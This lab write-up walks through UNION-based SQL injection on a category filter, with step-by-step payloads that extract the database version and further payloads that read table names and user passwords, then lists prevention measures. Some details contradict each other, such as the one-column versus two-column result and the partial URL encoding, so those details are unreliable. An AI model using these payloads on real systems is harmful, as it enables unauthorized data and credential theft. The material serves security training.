# Lab 4: SQL Injection - Database Version Extraction with URL Encoding

## Objective
Exploit a SQL injection vulnerability in the category filter to extract the database version. This lab demonstrates the importance of URL encoding and the iterative process of SQL injection exploitation.

## Lab Description
This lab contains a SQL injection vulnerability in the product category filter. The goal is to determine the database type and extract the version information using UNION-based SQL injection with proper URL encoding.

## Important Observation

**🔑 Key Learning:** Not all payloads work as plain text in URLs. Sometimes you need to URL encode your SQL injection payloads for them to work correctly.

## The Challenge

The category filter is vulnerable to SQL injection, but there are some quirks:
- Plain text payloads don't always work
- Different commenting styles have varying success
- URL encoding is often required
- The database responds differently to different approaches

## Initial Reconnaissance

### The Vulnerable Endpoint

```
GET /filter?category=Accessories
```

This parameter is where we'll inject our SQL payloads.

## Solution - Step by Step

### Trial 1: Basic UNION Attack (FAILED ❌)

**Payload:**
```sql
GET /filter?category=Accessories' UNION SELECT 1,2-- HTTP/2
```

**Result:** Did not work

**Possible Reasons:**
- The `--` comment style might not be recognized
- URL encoding might be required
- Wrong number of columns
- Database-specific syntax requirements

### Trial 2: Using ORDER BY (FAILED ❌)

**Payload:**
```sql
GET /filter?category=Accessories' ORDER BY 1-- HTTP/2
```

**Expected:** Should return `200 OK` if syntax is correct

**Result:** Did not work

**Analysis:** The `--` comment syntax doesn't seem to be working. Time to try alternative commenting.

### Trial 3: Hash Comment (SUCCESS ✅)

**Payload:**
```sql
GET /filter?category=Accessories' UNION SELECT 1# HTTP/2
```

**Result:** `200 OK` - Success!

**Discovery:** The database accepts `#` as a comment delimiter instead of `--`

**Note:** Different databases use different comment styles:
- MySQL: `#` or `-- ` (with space)
- Oracle: `--`
- MSSQL: `--`
- PostgreSQL: `--`

### Trial 4: Determining Column Count (SUCCESS ✅)

**Payload:**
```sql
GET /filter?category=Accessories' UNION SELECT 1,2# HTTP/2
```

**Result:** `200 OK`

**Conclusion:** The query returns **2 columns**

### Trial 5: Testing Column Data Types

Now we need to verify which columns accept text data.

**Testing Column 1:**
```sql
GET /filter?category=Accessories' UNION SELECT "abcdrf",1# HTTP/2
```

**Testing Column 2:**
```sql
GET /filter?category=Accessories' UNION SELECT 1,"abc"# HTTP/2
```

**Final Test (Both Columns):**
```sql
GET /filter?category=Accessories' UNION SELECT "abcdrf","abc"# HTTP/2
```

**Conclusion:** Both columns accept text/string data

### Trial 6: Extracting Database Version (SUCCESS ✅)

Since we've confirmed the database is either Microsoft SQL Server or MySQL (based on the `@@version` syntax), we can extract the version.

**Payload:**
```sql
GET /filter?category=Accessories' UNION SELECT @@version,"abc"# HTTP/2
```

**Important:** For Microsoft SQL Server and MySQL, we don't need a `FROM` clause when using `@@version`

## The Critical Step: URL Encoding

### Why URL Encoding is Necessary

**The Problem:**
- SQL injection payloads contain special characters: `'`, `#`, spaces, `@`, etc.
- Web servers and applications may interpret these characters incorrectly
- Without encoding, payloads might be truncated or malformed

**The Solution:**
Use `Ctrl+U` in Burp Suite to URL encode the payload

### URL Encoding in Burp Suite

**Before Encoding:**
```http
GET /filter?category=Accessories' UNION SELECT @@version,"abc"# HTTP/2
```

**After Encoding (Ctrl+U):**
```http
GET /filter?category=Accessories'%20UNION%20SELECT%20@@version,%22abc%22%23 HTTP/2
```

**URL Encoding Reference:**

| Character | URL Encoded |
|-----------|-------------|
| Space | `%20` |
| `'` (single quote) | `%27` |
| `"` (double quote) | `%22` |
| `#` (hash) | `%23` |
| `@` (at symbol) | `%40` |
| `,` (comma) | `%2C` |
| `;` (semicolon) | `%3B` |

### The Final Working Payload

**Plain Text:**
```sql
Accessories' UNION SELECT @@version,"abc"#
```

**URL Encoded:**
```
Accessories'%20UNION%20SELECT%20@@version,%22abc%22%23
```

**Full Request:**
```http
GET /filter?category=Accessories'%20UNION%20SELECT%20@@version,%22abc%22%23 HTTP/2
Host: vulnerable-website.com
Cookie: session=...
```

## Why Switch from ORDER BY to UNION?

### ORDER BY Purpose
- Used to determine the number of columns
- Does NOT retrieve data
- Just sorts existing results

### UNION Purpose
- Used to retrieve additional data
- Combines results from multiple SELECT statements
- Perfect for extracting database information

**Progression:**
```
1. ORDER BY → Determine column count
2. UNION SELECT → Extract data
```

## Database-Specific Notes

### Microsoft SQL Server & MySQL

**Version Retrieval:**
```sql
SELECT @@version
```

**No FROM clause needed** - This is a key difference from Oracle

### Oracle

**Version Retrieval:**
```sql
SELECT banner FROM v$version
```

**Requires FROM clause** - Must use a table like `dual`

### PostgreSQL

**Version Retrieval:**
```sql
SELECT version()
```

## Complete Attack Workflow

### Step-by-Step Process

```
1. Identify vulnerable parameter
   ↓
2. Test for SQL injection (add single quote)
   ↓
3. Determine column count (ORDER BY or UNION with NULLs)
   ↓
4. Identify column data types (test with strings/numbers)
   ↓
5. Extract desired data (@@version, table names, etc.)
   ↓
6. URL encode the payload
   ↓
7. Execute and retrieve results
```

## Testing Different Comment Styles

### Comment Style Variations

| Database | Comment Syntax |
|----------|----------------|
| MySQL | `#` or `-- ` (space required) |
| Oracle | `--` |
| MSSQL | `--` or `/* */` |
| PostgreSQL | `--` |

### Testing Process

**Try 1:** Use `--` comment
```sql
' UNION SELECT 1,2--
```

**Try 2:** Use `-- ` comment (with space)
```sql
' UNION SELECT 1,2-- 
```

**Try 3:** Use `#` comment
```sql
' UNION SELECT 1,2#
```

**Try 4:** Use `/* */` comment
```sql
' UNION SELECT 1,2/* 
```

## Common Issues and Solutions

### Issue 1: Payload Not Working

**Problem:** Plain text payload doesn't execute

**Solution:** Apply URL encoding (`Ctrl+U` in Burp Suite)

### Issue 2: Comment Not Recognized

**Problem:** `--` doesn't work as a comment

**Solution:** Try alternative comment styles (`#`, `/* */`)

### Issue 3: Column Count Mismatch

**Problem:** UNION query fails

**Solution:** Use ORDER BY or trial-and-error with NULL values to find correct column count

### Issue 4: Data Type Mismatch

**Problem:** Column doesn't accept text

**Solution:** Test each column individually with strings and numbers

## Advanced Techniques

### Using NULL for Type Detection

Instead of guessing data types:
```sql
' UNION SELECT NULL,NULL#
' UNION SELECT 'test',NULL#
' UNION SELECT NULL,'test'#
' UNION SELECT 'test','test'#
```

Benefits:
- NULL is compatible with any data type
- Systematically test each column
- More reliable than guessing

### Extracting Other Information

**Table Names:**
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables#
```

**Column Names:**
```sql
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'#
```

**User Data:**
```sql
' UNION SELECT username,password FROM users#
```

## Burp Suite Tips

### Using Repeater

1. Send the request to Repeater (`Ctrl+R`)
2. Modify the payload
3. Click "Send"
4. View response immediately
5. Iterate quickly

### URL Encoding Shortcuts

- **Encode:** `Ctrl+U`
- **Decode:** `Ctrl+Shift+U`
- **Encode as you type:** Enable in Repeater settings

### Request History

- All requests are saved in "HTTP history"
- Compare different payloads
- Track what works and what doesn't

## Key Learnings

1. **URL Encoding is Critical** - Always encode special characters in payloads
2. **Comment Syntax Varies** - Different databases use different comment styles
3. **Iterative Process** - SQL injection requires trial and error
4. **ORDER BY vs UNION** - Each has a specific purpose in the attack chain
5. **Know Your Database** - Syntax differs between database systems
6. **Use Burp Suite Effectively** - Repeater and Encoder are essential tools

## Prevention Measures

### For Developers

1. **Use Parameterized Queries** (Prepared Statements)
   ```python
   # Secure
   cursor.execute("SELECT * FROM products WHERE category = ?", (category,))
   
   # Vulnerable
   cursor.execute("SELECT * FROM products WHERE category = '" + category + "'")
   ```

2. **Input Validation**
   - Whitelist allowed values
   - Reject special characters
   - Validate data types

3. **Use ORMs**
   - Frameworks like SQLAlchemy, Hibernate, Entity Framework
   - Abstract SQL queries
   - Built-in protection

4. **Least Privilege**
   - Database user should have minimal permissions
   - Don't use admin accounts for web applications

5. **WAF (Web Application Firewall)**
   - Detect and block SQL injection attempts
   - Monitor for suspicious patterns

## Attack Summary

| Step | Payload | Result |
|------|---------|--------|
| 1 | `' UNION SELECT 1,2--` | Failed |
| 2 | `' ORDER BY 1--` | Failed |
| 3 | `' UNION SELECT 1#` | Success (1 column) |
| 4 | `' UNION SELECT 1,2#` | Success (2 columns) |
| 5 | `' UNION SELECT "test","test"#` | Success (both text) |
| 6 | `' UNION SELECT @@version,"abc"#` | Success (got version) |
| 7 | URL encode with `Ctrl+U` | Final success |

## Status
✅ **Lab Completed** - Successfully extracted database version using UNION-based SQL injection with URL encoding